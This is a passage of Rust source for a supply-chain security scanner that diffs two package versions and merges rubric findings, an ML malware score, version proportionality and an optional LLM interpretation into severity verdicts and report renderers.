//! One differential analysis, shared by every output format.
//!
//! cleave's `diff_paths` measures the change (six scopes); [`crate::rubric`]
//! judges it; [`crate::version`] supplies proportionality; [`crate::risk`]
//! scores both sides with the ML model. This module runs that pipeline exactly
//! once and hands the result to a renderer — the terminal grid, the JSON
//! envelope, the SARIF file, or the PR-comment markdown.
//!
//! Running it once is the whole point: `isomer ci` emits four sinks from a
//! single scan, and analysis is the expensive part.

use std::cell::OnceCell;
use std::collections::HashSet;
use std::path::Path;

use anyhow::{Context, Result};
use cleave::types::{
    AnalysisReport, Changed, DiffReportV1, DiffSummary, FileDiffEntry, FileStatus, KvChange,
    MetricChange, ScopeDiff, ScopeDiffs, ScopeRocs, SectionChange, StringChange, SymbolChange,
    TraitChange,
};

use crate::evidence::Hunk;
use crate::rubric::Assessment;
use crate::version::{Bump, BumpKind, Version};
use crate::{Cli, Format, Gate, Severity};

/// Run cleave's differential analysis over a pair of paths.
pub(crate) fn diff(
    old: &Path,
    new: &Path,
    options: &cleave::AnalysisOptions,
) -> Result<AnalysisReport> {
    cleave::diff::diff_paths(
        old,
        new,
        options,
        cleave::diff::ScopeMask::all(),
        cleave::diff::DEFAULT_LIMIT_CHANGES,
    )
}

/// How much of a change a run actually looked at.
///
/// Reported so a reader never has to assume. A pull request whose base build
/// failed still produces a verdict — but only over the source, and a report
/// that did not say so would read exactly like one that compared both builds
/// and found nothing wrong.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub(crate) enum Scope {
    /// The committed change, and nothing built from it.
    Source,
    /// The committed change plus the build outputs of both sides.
    SourceAndBuild,
}

impl Scope {
    pub(crate) fn label(self) -> &'static str {
        match self {
            Self::Source => "source only",
            Self::SourceAndBuild => "source + build output",
        }
    }
}

/// One file's two sides, named the way a reader should see it.
///
/// A comparison is a *set* of these: `fs` on two files has one, `ci` on a pull
/// request has one per changed file. Deep analysis (evidence, ML risk, base
/// capabilities) is per file, so it needs the pairing that the two root paths
/// alone don't carry. Either side may be absent — a file added by the change
/// has no old side, a deleted one has no new side.
#[derive(Debug)]
pub(crate) struct Pair {
    /// How the file is named in output: repo-relative under `ci`, the
    /// basename under `fs`.
    pub label: String,
    pub old: Option<std::path::PathBuf>,
    pub new: Option<std::path::PathBuf>,
}

impl Pair {
    /// Pairs for a two-root comparison: the roots themselves when both sides
    /// are single files (cleave pairs them by canonical root, whatever they
    /// are named), otherwise one pair per file the diff reports as touched.
    fn from_roots(old: &Path, new: &Path, diff: &DiffReportV1) -> Vec<Self> {
        if old.is_file() && new.is_file() {
            return vec![Self {
                label: basename(new),
                old: Some(old.to_path_buf()),
                new: Some(new.to_path_buf()),
            }];
        }
        diff.files
            .iter()
            .filter(|f| !matches!(f.status, cleave::types::FileStatus::Unchanged))
            // Archive members are decomposed by the analysis of their
            // container, which has its own pair; pairing them again would
            // double-count and point at paths that don't exist on disk.
            .filter(|f| !f.path.contains("!!"))
            .map(|f| Self {
                label: f.path.clone(),
                old: existing(old.join(&f.path)),
                new: existing(new.join(&f.path)),
            })
            .collect()
    }
}

fn existing(p: std::path::PathBuf) -> Option<std::path::PathBuf> {
    p.is_file().then_some(p)
}

/// Trait atoms that moved on one file, worst criticality first. Added and
/// removed together — a reviewer wants both directions of a source change.
fn trait_atoms(entry: &cleave::types::FileDiffEntry) -> Vec<Atom> {
    let Some(traits) = entry.scopes.traits.as_ref() else {
        return Vec::new();
    };
    let mut atoms: Vec<Atom> = traits
        .added
        .iter()
        .map(|t| (true, t))
        .chain(traits.removed.iter().map(|t| (false, t)))
        .map(|(gained, t)| Atom {
            id: t.id.clone(),
            desc: t.desc.clone(),
            crit: t.crit,
            gained,
        })
        .collect();
    atoms.sort_by(|a, b| {
        crate::rubric::crit_rank(b.crit)
            .cmp(&crate::rubric::crit_rank(a.crit))
            .then(a.id.cmp(&b.id))
    });
    atoms
}

/// A full line diff of two text files: `+` for a line only on the new side,
/// `-` for one only on the old, a space for context. Set-based (not
/// positional), so a moved line reads as context and the output is
/// order-independent — enough for an LLM to see exactly what text entered or
/// left. Control chars are neutralized; the total is line-capped so one large
/// file can't blow the context budget.
fn line_diff(old: &[u8], new: &[u8]) -> String {
    use std::collections::HashSet;
    use std::fmt::Write as _;
    const MAX_LINES: usize = 400;

    let old_text = String::from_utf8_lossy(old);
    let new_text = String::from_utf8_lossy(new);
    let old_set: HashSet<&str> = old_text.lines().map(str::trim_end).collect();
    let new_set: HashSet<&str> = new_text.lines().map(str::trim_end).collect();

    let mut s = String::new();
    let new_lines: Vec<&str> = new_text.lines().collect();
    for line in new_lines.iter().take(MAX_LINES) {
        let mark = if old_set.contains(line.trim_end()) {
            ' '
        } else {
            '+'
        };
        let _ = writeln!(s, "{mark} {}", crate::printable(line));
    }
    if new_lines.len() > MAX_LINES {
        let _ = writeln!(s, "  … (diff truncated)");
    }
    for line in old_text
        .lines()
        .filter(|l| !new_set.contains(l.trim_end()))
        .take(MAX_LINES)
    {
        let _ = writeln!(s, "- {}", crate::printable(line));
    }
    s
}

/// The cleave diff plus everything isomer derived from it.
///
/// Borrows the (large) cleave report rather than owning it, so the caller
/// produces it once and every renderer reads the same copy.
pub(crate) struct Analysis<'a> {
    /// The surface that produced this analysis, e.g. `fs` or `ci`.
    pub verb: &'static str,
    pub options: &'a cleave::AnalysisOptions,
    pub report: &'a AnalysisReport,
    /// Raw cleave diff, retained for byte/evidence lookup using original paths.
    pub diff: &'a DiffReportV1,
    /// Version-root-normalized member diff used for judgement and display.
    pub judged_diff: DiffReportV1,
    /// The changed files, each with both sides — what deep analysis runs over.
    pub pairs: Vec<Pair>,
    /// What each side exhibits: base capability classes, and the ATT&CK / MBC
    /// ids present before and after.
    pub survey: crate::evidence::Survey,
    pub assessment: Assessment,
    pub naming: Naming,
    pub prop: Proportionality,
    pub risk: Option<crate::risk::Risk>,
    /// A source-archive build macro gained a joined shell-evaluation shape.
    /// Shared by the deterministic gate, terminal view, and LLM context.
    pub source_build_anomaly: bool,
    /// A suspicious build loader remained byte-identical while one of its
    /// compressed test-data carriers changed. This is the two-release xz
    /// shape: stable activation logic with a refreshed hidden stage.
    pub source_payload_refresh: bool,
    /// Worst of the rubric axes and the *current* ML risk band — "how bad is
    /// it now".
    pub verdict: Severity,
    /// The verdict before any optional LLM escalation. Terminal and LLM
    /// context use this to distinguish deterministic evidence from the model's
    /// later opinion.
    pub deterministic_verdict: Severity,
    /// Newly-introduced risk only (rubric-new ∪ an ML band jump) — the axis
    /// `--gate new` acts on.
    pub new_verdict: Severity,
    /// The severity the active `--gate` compares against `--fail-on`.
    pub gated: Severity,
    /// Whether the run passes at `--fail-on`.
    pub clean: bool,
    /// Optional `--llm` read of the change.
    pub interp: Option<crate::llm::Interpretation>,
    /// True when the model's verdict pulled [`Self::risk`]'s new score up to
    /// its band floor — so the report can attribute the raised number honestly
    /// (`azoth+llm`) instead of crediting azoth with a value it did not emit.
    pub risk_llm_raised: bool,
    /// What the comparison actually covered. A verb fills this in when it
    /// knows; `None` means the surface has nothing useful to say about scope
    /// (`fs` compares two paths the caller named, so "source" would be a lie).
    pub scope: Option<Scope>,
    /// Profiles of the dependencies this change added — what each can do,
    /// attributed to the dependency. Empty unless `--deps` was requested; a
    /// verb fills it after construction, since it is a separate network step.
    pub deps: Vec<crate::deps::DepProfile>,
    /// Evidence hunks, ranked strongest-first, computed on first use.
    ///
    /// Collecting them re-analyzes every changed file, and `ci` renders four
    /// formats from one analysis — so this is computed at most once per run,
    /// and not at all for a run with nothing to show.
    hunks: OnceCell<Vec<Hunk>>,
    /// Source files whose traits moved, with the atoms and a full line diff —
    /// the signal the Notable finding floor drops. Reads both sides from disk,
    /// so it is computed at most once per run.
    source_changes: OnceCell<Vec<SourceChange>>,
}

/// A source-language file whose behavior-bearing traits changed between the two
/// sides. Carries what the strict rubric discards: the sub-Notable atoms that
/// moved (a `$HOME` read, a base64 heredoc) and a full line diff. An attack
/// composed entirely of individually-innocent atoms — no single trait reaching
/// the finding floor — leaves its whole fingerprint here.
#[derive(Debug)]
pub(crate) struct SourceChange {
    /// How the file is named in output.
    pub label: String,
    /// Trait atoms that appeared or vanished, worst criticality first. Includes
    /// the baseline/component tiers [`crate::rubric::is_finding`] filters out.
    pub atoms: Vec<Atom>,
    /// Full line diff of the file (`+` added, `-` removed), for the LLM.
    pub diff: String,
}

/// One trait that appeared or vanished on a source file.
#[derive(Debug)]
pub(crate) struct Atom {
    pub id: String,
    pub desc: String,
    pub crit: cleave::Criticality,
    /// True when the trait is present on the new side but not the old.
    pub gained: bool,
}

impl<'a> Analysis<'a> {
    /// Judge a completed cleave diff.
    pub(crate) fn new(
        verb: &'static str,
        old: &'a Path,
        new: &'a Path,
        options: &'a cleave::AnalysisOptions,
        report: &'a AnalysisReport,
        cli: &Cli,
    ) -> Result<Self> {
        let diff = report
            .diff
            .as_ref()
            .context("diff_paths returned a report without a diff")?;

        let pairs = Pair::from_roots(old, new, diff);
        let judged_diff = normalized_archive_diff(diff);
        let source_archive = is_source_archive(old) && is_source_archive(new);
        let source_payload_refresh =
            source_archive && stable_source_loader_payload_refresh(old, new, diff);
        let source_build_anomaly = source_archive
            && (source_build_macro_anomaly(new, &judged_diff) || source_payload_refresh);

        // One walk over both sides: the base's capability classes (so a wholly
        // new class is distinguishable from one that merely gained a trait)
        // and the ATT&CK / MBC annotations each side carries.
        let survey = crate::evidence::survey(&pairs, options);
        let assessment = crate::rubric::assess(&judged_diff, &survey.base_classes);
        let naming = Naming::resolve(old, new, cli);
        let prop = Proportionality::eval(
            &assessment,
            &naming,
            &judged_diff,
            source_archive,
            source_build_anomaly,
        );

        // Azoth ML risk is the *primary* detector: a jump into a worse band
        // drives the verdict on its own, even when no trait or signature
        // fired. `None` when no model is available — then the hand-coded
        // rubric stands alone.
        let risk = crate::risk::score(&pairs);
        let risk_now = risk.map_or(Severity::None, |r| risk_band(r.new));
        let risk_jump = risk.map_or(Severity::None, |r| {
            if risk_band(r.new) > risk_band(r.old) {
                risk_band(r.new)
            } else {
                Severity::None
            }
        });

        // A few attacks are composed of individually medium traits, so the
        // per-trait rubric never reaches the gate. Two shape signals are
        // deliberately generic: a dense capability jump in one/few files,
        // and an endgame package that deletes most of its previous tree. They
        // use cleave's existing change metrics rather than another taxonomy.
        let shape_escalation = change_shape_escalation(
            &assessment,
            &judged_diff,
            naming.bump,
            source_archive,
            source_build_anomaly,
        );
        let cleanup_signature = remediation_cleanup_context(&assessment, &judged_diff, risk);

        // A capability the version bump does not license *is* the supply-chain
        // signal — so a disproportionate gain is escalated to a gate-failing
        // severity even when the gained trait's own criticality is only medium.
        // The bump's tolerance already scopes this: `Minor`/`Major` are only
        // disproportionate on a High+ gain (already gate-failing, so this is a
        // no-op), and it bites exactly where it should — a `patch`/`same`
        // (repack) release that has no business gaining behavior at all
        // (unrealircd: a same-version repack that gained byte-comparison and
        // privilege-escalation traits, medium each, under the high gate).
        let escalation = if prop.disproportionate && !cleanup_signature {
            Severity::High
        } else {
            Severity::None
        };
        let rubric_new = if cleanup_signature {
            assessment.new_severity_without_signatures()
        } else {
            assessment.new_severity()
        };
        let shape_new = if cleanup_signature {
            Severity::None
        } else {
            shape_escalation
        };
        // The human-facing deterministic verdict must include the same
        // escalation signals as the gate. Otherwise a shape-only attack can
        // fail a High gate while the masthead still says NOTABLE (faker's
        // endgame package deletion was the concrete example). Keep the raw
        // Azoth probability untouched: a low model score beside a gate-worthy
        // deterministic verdict honestly shows which detector caught it.
        let verdict = assessment
            .severity
            .max(risk_now)
            .max(escalation)
            .max(shape_new);
        let new_verdict = rubric_new.max(risk_jump).max(escalation).max(shape_new);
        let gated = match cli.gate {
            Gate::New => new_verdict,
            Gate::Any => verdict.max(escalation),
        };

        let mut a = Self {
            verb,
            options,
            report,
            diff,
            judged_diff,
            pairs,
            survey,
            assessment,
            naming,
            prop,
            risk,
            source_build_anomaly,
            source_payload_refresh,
            verdict,
            new_verdict,
            gated,
            clean: !gated.fails(cli.fail_on),
            deterministic_verdict: verdict,
            interp: None,
            risk_llm_raised: false,
            scope: None,
            deps: Vec::new(),
            hunks: OnceCell::new(),
            source_changes: OnceCell::new(),
        };
        // The LLM read is asked for only when there is a change worth
        // describing — a silent diff has nothing to interpret, and the call
        // costs a round trip. Failures log and never block the verdict.
        if cli.format != Format::Interpret
            && a.speaks(cli)
            && let Some(cfg) = crate::llm::config(cli)
        {
            a.interp = match crate::llm::interpret(&cfg, &a.llm_context()) {
                Ok(i) => Some(i),
                Err(e) => {
                    eprintln!("isomer: llm interpretation failed: {e:#}");
                    None
                }
            };
        }
        // The model's read is a detection signal, not just a caption: fold its
        // verdict into the *displayed* severity so a change the rubric
        // under-rates but the model calls malicious is escalated (SUSPICIOUS →
        // HOSTILE), and pull the risk bar up to the band that call implies. It
        // only ever raises — a benign read never lowers a rubric finding.
        //
        // The gate (`gated`/`clean`, the CI exit code) is deliberately left
        // deterministic: a model hallucination must not fail someone's build.
        // So the LLM sharpens the human-facing verdict without making CI
        // non-reproducible.
        if let Some(sev) = a.interp.as_ref().map(crate::llm::Interpretation::severity)
            && sev > Severity::None
        {
            a.verdict = a.verdict.max(sev);
            if let Some(r) = a.risk.as_mut() {
                let floor = a
                    .interp
                    .as_ref()
                    .map_or(0.0, crate::llm::Interpretation::risk_floor);
                if r.new < floor {
                    r.new = floor;
                    a.risk_llm_raised = true;
                }
            }
        }
        Ok(a)
    }

    /// Render one output format.
    pub(crate) fn render(&self, format: Format, cli: &Cli) -> Result<String> {
        match format {
            Format::Terminal => Ok(crate::terminal::report(self, cli)),
            Format::Json => Ok(format!("{}\n", self.json(cli)?)),
            Format::Markdown => Ok(crate::markdown::report(self, cli)),
            Format::Sarif => Ok(format!("{}\n", crate::sarif::report(self)?)),
            // Keep this byte-for-byte identical to the user message passed to
            // `llm::interpret`: no system prompt, verdict line, or added
            // newline. This mirrors scan's `--format interpret` contract and
            // makes the payload independently inspectable/replayable.
            Format::Interpret => Ok(self.llm_context()),
        }
    }

    /// Differential view for human/model presentation. Archive package roots
    /// with embedded versions are paired before counts and paths are shown.
    pub(crate) fn display_diff(&self) -> &DiffReportV1 {
        &self.judged_diff
    }

    /// Whether there is anything worth saying.
    ///
    /// Everything the rubric measures is *change* — a finding present
    /// unchanged on both sides never enters the diff — so an assessment
    /// reaching Notable means this change introduced something worth naming,
    /// hostile or not. Saying so is also how a reviewer knows the scanner is
    /// alive between real incidents. A run with nothing to report still says
    /// nothing at all.
    pub(crate) fn speaks(&self, cli: &Cli) -> bool {
        self.gated.fails(cli.fail_on)
            // Notable+ is the reporting floor; the tiers below it are atoms
            // and unremarkable observations (see `rubric::is_finding`).
            || self.assessment.severity >= Severity::Medium
            || self.risk_band_moved()
            || self.prop.disproportionate
            // An implant-shaped change always deserves words.
            || self.prop.skew.is_some()
            // Gained external code — a runtime dependency or a new/moved
            // GitHub Action — is a supply-chain event worth surfacing on its
            // own, even when it stays below the gate.
            || self.assessment.structure.adds_external_code()
            // A source file that gained behavior-bearing atoms below the finding
            // floor (a `$HOME` read, a base64 heredoc) changed how it behaves
            // even when no single trait rose to a finding. Say so — a silent
            // verdict on a file that plainly gained obfuscation is the exact
            // blind spot an atom-composed attack aims for.
            || !self.observations().is_empty()
    }

    /// Whether the model's read moved between risk bands, in either direction.
    /// A drop matters too: it is how a reviewer sees that a fix landed.
    pub(crate) fn risk_band_moved(&self) -> bool {
        self.risk
            .is_some_and(|r| risk_band(r.new) != risk_band(r.old))
    }

    /// The judgement, in one line, before any detail. What a reader wants
    /// first is not what changed, but what isomer makes of it.
    pub(crate) fn judgement(&self) -> String {
        if !self.clean {
            return self.headline();
        }
        self.clean_note()
    }

    /// Like [`judgement`](Self::judgement) but with the model's read left for
    /// its own line — used by the terminal, which prints `✨ nature` separately,
    /// so the two never echo each other.
    pub(crate) fn reason(&self) -> String {
        if !self.clean {
            return self.headline_facts();
        }
        self.clean_note()
    }

    /// The passing-change note: how much was noticed, and whether the model's
    /// band moved. Shared by [`judgement`](Self::judgement) and
    /// [`reason`](Self::reason); the LLM's phrasing has no place here (a clean
    /// verdict's note is about counts, not the read).
    fn clean_note(&self) -> String {
        let noted = self.assessment.behavioral.categories.len()
            + self.assessment.signature.ids.len()
            + self.assessment.identity.changes.len()
            + self.assessment.structure.facts.len();
        match (noted, self.risk_band_moved()) {
            (0, false) => "no behavioral change".to_string(),
            (0, true) => "no new capabilities, but the model reads this differently".to_string(),
            (n, _) => format!(
                "nothing that fails the gate — {n} change{} worth a look",
                if n == 1 { "" } else { "s" },
            ),
        }
    }

    /// The strongest `limit` evidence hunks behind the verdict, in file order.
    pub(crate) fn hunks(&self, limit: usize) -> Vec<&Hunk> {
        let all = self.hunks.get_or_init(|| {
            crate::evidence::hunks(
                &self.pairs,
                self.options,
                &self.assessment.gained_ids(),
                self.diff,
            )
        });
        crate::evidence::strongest(all, limit)
    }

    /// Source files whose traits moved, each with the atoms and a full line
    /// diff. Computed once and memoized (both sides are read from disk).
    ///
    /// This is the seam that keeps a diff from going silent when an attack is
    /// composed of individually-innocent atoms: no single trait reaches the
    /// Notable finding floor, so the rubric surfaces nothing, but the file still
    /// *changed behavior* — and here that change is captured whole, both for the
    /// [`observations`](Self::observations) a reviewer sees and for the full
    /// diff the LLM reads.
    pub(crate) fn source_changes(&self) -> &[SourceChange] {
        self.source_changes
            .get_or_init(|| self.collect_source_changes())
    }

    /// Walk the pairs, keeping the source-language files whose trait scope
    /// changed, and pair each with the atoms that moved and a line diff.
    fn collect_source_changes(&self) -> Vec<SourceChange> {
        use cleave::types::FileStatus;
        // A single-file `fs` comparison names its one diff entry `<root>`, not
        // the basename, so it can't be matched to the pair by path — but there
        // is only one pair, so the lone changed entry is unambiguously its.
        let single = self.pairs.len() == 1;
        let mut out = Vec::new();
        for pair in &self.pairs {
            let (Some(old), Some(new)) = (pair.old.as_deref(), pair.new.as_deref()) else {
                continue;
            };
            let Some(entry) = self.diff.files.iter().find(|f| {
                !matches!(f.status, FileStatus::Unchanged)
                    && (single || f.path == pair.label)
                    && f.scopes
                        .traits
                        .as_ref()
                        .is_some_and(|t| !t.added.is_empty() || !t.removed.is_empty())
            }) else {
                continue;
            };
            // Cheap fileid (no full parse) on the new side decides source-ness;
            // manifests (package.json) are structured data, not a source
            // language, and are covered by the dependency path instead.
            let Ok(new_bytes) = std::fs::read(new) else {
                continue;
            };
            if !filefacts::FileId::from_path_and_bytes(new, &new_bytes)
                .file_type()
                .is_source_code()
            {
                continue;
            }
            let old_bytes = std::fs::read(old).unwrap_or_default();
            out.push(SourceChange {
                label: pair.label.clone(),
                atoms: trait_atoms(entry),
                diff: line_diff(&old_bytes, &new_bytes),
            });
        }
        out
    }

    /// The gained sub-Notable atoms across every changed source file — the
    /// behavioral changes the rubric dropped, for the report's observations
    /// line. Findings (Notable+) are already named as capability classes, so
    /// they are excluded here to avoid saying the same thing twice.
    pub(crate) fn observations(&self) -> Vec<&Atom> {
        self.source_changes()
            .iter()
            .flat_map(|c| &c.atoms)
            .filter(|a| a.gained && !crate::rubric::is_finding(a.crit))
            .collect()
    }

    /// The one-line reason a reader needs first: why the change is judged the
    /// way it is. Prefers the LLM read, then the proportionality note, then
    /// the worst capability class.
    pub(crate) fn headline(&self) -> String {
        if let Some(i) = self.interp.as_ref().filter(|i| !i.nature.trim().is_empty()) {
            return i.nature.trim().to_string();
        }
        self.headline_facts()
    }

    /// The deterministic one-liner behind the verdict — proportionality, then
    /// the worst capability class, signature, or structural fact. The model's
    /// read is *not* consulted; [`headline`](Self::headline) prefers it, but a
    /// surface that shows the read on its own line uses this so they do not
    /// repeat.
    pub(crate) fn headline_facts(&self) -> String {
        if restored_endgame_package_shape(self.display_diff()) {
            return "restored package runtime tree and declared entrypoint".to_string();
        }
        if dependency_with_fallback_load(&self.assessment, &self.judged_diff) {
            return "added dependency alongside fallback module load".to_string();
        }
        if let Some(note) = self
            .prop
            .note
            .as_ref()
            .filter(|_| self.prop.disproportionate)
        {
            return note.clone();
        }
        if let Some(skew) = &self.prop.skew {
            return skew.clone();
        }
        let classes: HashSet<&str> = self
            .assessment
            .behavioral
            .categories
            .iter()
            .map(|c| c.class.as_str())
            .collect();
        let has = |class: &str| classes.contains(class);
        if has("anti-static") && has("fs/file") && has("fs/delete") {
            if has("communications/http") {
                return "gained obfuscated web payload with file write/delete".to_string();
            }
            return "gained obfuscated self-deleting file payload".to_string();
        }
        if has("anti-static") && has("impact") {
            return "gained obfuscated destructive behavior".to_string();
        }
        if let Some(c) = self.assessment.behavioral.categories.first() {
            let verb = if self.assessment.behavioral.is_new_category(c) {
                "gained"
            } else {
                "expanded"
            };
            return format!("{verb} {}", c.label);
        }
        if let Some(s) = self.assessment.signature.ids.first() {
            return format!(
                "matched a known-bad rule — {}",
                crate::rubric::short_name(&s.id)
            );
        }
        if let Some(f) = self.assessment.structure.facts.first() {
            return format!("{}: {}", f.label, f.detail);
        }
        "no behavioral change".to_string()
    }

    /// Compact, cross-scope facts about the *shape* of the differential. These
    /// are deliberately shared by the LLM and terminal views: they explain
    /// why a modest version change can be alarming without dumping the raw
    /// cleave report into either audience's primary view.
    pub(crate) fn differential_summary(&self) -> Vec<String> {
        let d = self.display_diff();
        let nested = d.files.iter().any(|f| f.path.contains("!!"));
        let added = d.summary.files_added as usize;
        let removed = d.summary.files_removed as usize;
        let mut changed = d.summary.files_changed as usize;
        let unchanged = d.summary.files_unchanged as usize;
        if nested {
            // The container itself is a synthetic root entry; the member
            // topology is what an analyst means by the package change.
            if d.files.iter().any(|f| f.path == "<root>") {
                changed = changed.saturating_sub(1);
            }
        }
        let total = added + removed + changed + unchanged;
        let mut lines = vec![format!(
            "files: +{added} added, -{removed} removed, ~{changed} changed{}",
            if total > 0 {
                format!(", {total} compared")
            } else {
                String::new()
            }
        )];
        lines.push(format!(
            "scope ROC: overall {:.0}% · traits {:.0}% · metrics {:.0}% · facts {:.0}%",
            d.summary.overall_roc * 100.0,
            d.summary.scope_roc.traits * 100.0,
            d.summary.scope_roc.metrics * 100.0,
            d.summary.scope_roc.kv * 100.0,
        ));
        if let Some(size) = root_size_delta(d) {
            lines.push(format!("package size: {size}"));
        }
        if restored_endgame_package_shape(d) {
            lines.push(
                "restoration shape: a previously absent declared entrypoint and its large runtime tree returned"
                    .to_string(),
            );
        }
        lines.push(format!(
            "deterministic assessment: current {} · new {} · gate: {} · known-bad signatures: {}",
            self.deterministic_verdict.as_str(),
            self.new_verdict.as_str(),
            if self.clean { "pass" } else { "fail" },
            if self.assessment.signature.ids.is_empty() {
                "none matched"
            } else {
                "matched"
            }
        ));
        lines.push(format!(
            "primary deterministic signal: {}",
            self.headline_facts()
        ));

        let mut indicators = Vec::new();
        for file in &d.files {
            let Some(traits) = file.scopes.traits.as_ref() else {
                continue;
            };
            for t in traits
                .added
                .iter()
                .chain(traits.changed.iter().map(|c| &c.new))
            {
                let text = format!("{} {}", t.id, t.desc).to_ascii_lowercase();
                let archive = text.contains("archive")
                    || text.contains("zip")
                    || text.contains("7z")
                    || text.contains("jar");
                let delivery = (archive
                    && (text.contains("encrypt")
                        || text.contains("password")
                        || text.contains("executable member")
                        || text.contains("extension") && text.contains("mismatch")
                        || text.contains("high entropy")))
                    || text.contains("archive-incomplete")
                    || text.contains("malformed") && archive;
                if !delivery {
                    continue;
                }
                let short = crate::rubric::short_name(&t.id);
                let detail = if t.desc.is_empty() {
                    short.to_string()
                } else {
                    format!("{short}: {}", t.desc)
                };
                let detail = if t.count > 1 {
                    format!("{detail} (count {})", t.count)
                } else {
                    detail
                };
                if !indicators.iter().any(|v: &String| v == &detail) {
                    indicators.push(detail);
                }
            }
        }
        indicators.sort();
        indicators.truncate(8);
        if !indicators.is_empty() {
            lines.push(format!("payload indicators: {}", indicators.join(" · ")));
        }
        if self.source_build_anomaly {
            lines.push(if self.source_payload_refresh {
                "source build anomaly: suspicious build loader stayed byte-identical while a compressed test-data carrier changed"
                    .to_string()
            } else {
                "source build anomaly: changed m4 macro discovers source data, transforms a carrier, and evaluates it through the shell"
                    .to_string()
            });
        }

        let mut added_binaries = Vec::new();
        let mut removed_binaries = Vec::new();
        for file in &d.files {
            if !file.path.contains("!!") {
                continue;
            }
            let detected_type = self.member_file_type(&file.path, file.status);
            let is_payload = detected_type.is_some_and(is_compiled_binary_file_type)
                || (detected_type.is_none() && executable_member_layout(&file.path));
            if !is_payload {
                continue;
            }
            match file.status {
                cleave::types::FileStatus::Added => added_binaries.push(file.path.clone()),
                cleave::types::FileStatus::Removed => removed_binaries.push(file.path.clone()),
                cleave::types::FileStatus::Changed => {
                    added_binaries.push(file.path.clone());
                    removed_binaries.push(file.path.clone());
                }
                cleave::types::FileStatus::Unchanged => {}
            }
        }
        added_binaries.sort();
        added_binaries.dedup();
        removed_binaries.sort();
        removed_binaries.dedup();
        for member in added_binaries.iter().take(4) {
            if let Some(old) = removed_binaries
                .iter()
                .find(|old| normalized_member_path(old) == normalized_member_path(member))
            {
                lines.push(format!(
                    "compiled binary member replaced: {} -> {}",
                    display_member_path(old),
                    display_member_path(member)
                ));
            } else {
                lines.push(format!(
                    "compiled binary member added: {}",
                    display_member_path(member)
                ));
            }
        }
        lines
    }

    /// Parsed identity claims are useful context, but deliberately remain
    /// separate from the verdict. The diff carries normalized filefacts
    /// identity on each changed member; show the root claim first and only a
    /// few member claims so a large package cannot drown out behavior.
    pub(crate) fn identity_summary(&self) -> Vec<String> {
        let mut entries: Vec<(usize, String)> = Vec::new();
        for file in &self.judged_diff.files {
            let Some(identity) = file.identity.as_ref() else {
                continue;
            };
            let old = identity
                .old
                .as_ref()
                .map(identity_claims)
                .unwrap_or_default();
            let new = identity
                .new
                .as_ref()
                .map(identity_claims)
                .unwrap_or_default();
            if old.is_empty() && new.is_empty() {
                continue;
            }
            let side = |label: &str, claims: &[String]| {
                if claims.is_empty() {
                    return String::new();
                }
                format!("{label} {}", claims.join(", "))
            };
            let mut text = format!("{}: ", display_member_path(&file.path));
            let old_text = side("old", &old);
            let new_text = side("new", &new);
            if !old_text.is_empty() {
                text.push_str(&old_text);
            }
            if !old_text.is_empty() && !new_text.is_empty() {
                text.push_str(" -> ");
            }
            if !new_text.is_empty() {
                text.push_str(&new_text);
            }
            // The root describes the artifact; member claims provide useful
            // attribution (e.g. a library inside a package) but rank behind it.
            let priority = if file.path == "<root>" { 0 } else { 1 };
            entries.push((priority, text));
        }
        entries.sort_by(|a, b| a.0.cmp(&b.0).then(a.1.cmp(&b.1)));
        entries.truncate(6);
        entries.into_iter().map(|(_, text)| text).collect()
    }

    /// Identify an archive member from its bytes, using the same content-first
    /// filefacts detector as cleave. The diff stores analysis facts but not the
    /// member bytes, so recover them from the root archive when this is a local
    /// comparison. `None` means extraction was unavailable; callers may then
    /// use only a conservative package-layout hint.
    fn member_file_type(
        &self,
        path: &str,
        status: cleave::types::FileStatus,
    ) -> Option<filefacts::FileType> {
        let (root, member) = path.split_once("!!")?;
        let pair = self
            .pairs
            .iter()
            .find(|p| p.label == root)
            .or_else(|| (self.pairs.len() == 1).then(|| &self.pairs[0]))?;
        let archive = match status {
            cleave::types::FileStatus::Added | cleave::types::FileStatus::Changed => {
                pair.new.as_deref().or(pair.old.as_deref())
            }
            cleave::types::FileStatus::Removed => pair.old.as_deref().or(pair.new.as_deref()),
            cleave::types::FileStatus::Unchanged => None,
        }?;
        let bytes = cleave::extract_member(archive, member).ok().flatten()?;
        Some(filefacts::FileId::from_bytes(&bytes).file_type())
    }

    /// Build the plain-text payload describing the diff, sent to the LLM (and
    /// shown verbatim by `--format interpret`). No color, no rail — just the
    /// structured behavioral delta plus the matched code/bytes.
    pub(crate) fn llm_context(&self) -> String {
        use std::fmt::Write as _;
        let (a, naming, prop) = (&self.assessment, &self.naming, &self.prop);
        let mut s = String::new();
        let _ = writeln!(s, "artifact: {}", naming.name);
        if let (Some(o), Some(n)) = (&naming.old, &naming.new) {
            let bump = naming
                .bump
                .map(|b| format!(" ({})", b.describe()))
                .unwrap_or_default();
            let _ = writeln!(s, "version: {} -> {}{bump}", o.raw, n.raw);
        }
        if let Some(r) = self.risk {
            let _ = writeln!(s, "ml_malware_probability: {:.2} -> {:.2}", r.old, r.new);
        }
        if let Some(n) = &prop.note {
            let _ = writeln!(s, "proportionality: {n}");
        }
        if let Some(n) = &prop.skew {
            let _ = writeln!(s, "change shape: {n}");
        }
        s.push_str("\nDIFFERENTIAL SHAPE (high-signal facts):\n");
        for line in self.differential_summary() {
            let _ = writeln!(s, "- {line}");
        }
        s.push_str(
            "\nInterpret the indicators above as a joined differential, not as isolated labels.\n",
        );
        let _ = writeln!(
            s,
            "deterministic gate is {} before any model opinion; a passing gate is not a veto, but package size, ordinary assets, or generic library behavior alone are not grounds to override it.",
            if self.clean { "PASS" } else { "FAIL" }
        );
        let identities = self.identity_summary();
        if !identities.is_empty() {
            s.push_str("\nCLAIMED IDENTITY (context, not proof):\n");
            for line in identities {
                let _ = writeln!(s, "- {line}");
            }
        }

        let (fresh, expanded): (Vec<_>, Vec<_>) = a
            .behavioral
            .categories
            .iter()
            .partition(|c| a.behavioral.is_new_category(c));
        if !fresh.is_empty() {
            let _ = writeln!(s, "\nNEW capability classes (absent in old version):");
            for c in &fresh {
                let _ = writeln!(
                    s,
                    "- {} [{}]: {} ({} new traits)",
                    c.label,
                    c.severity.as_str(),
                    c.namespaces.join(", "),
                    c.new_ids.len()
                );
            }
        }
        if !expanded.is_empty() {
            let _ = writeln!(
                s,
                "\nEXPANDED capability classes (already present in old version):"
            );
            for c in &expanded {
                let _ = writeln!(
                    s,
                    "- {} [{}]: {} (+{} traits)",
                    c.label,
                    c.severity.as_str(),
                    c.namespaces.join(", "),
                    c.new_ids.len()
                );
            }
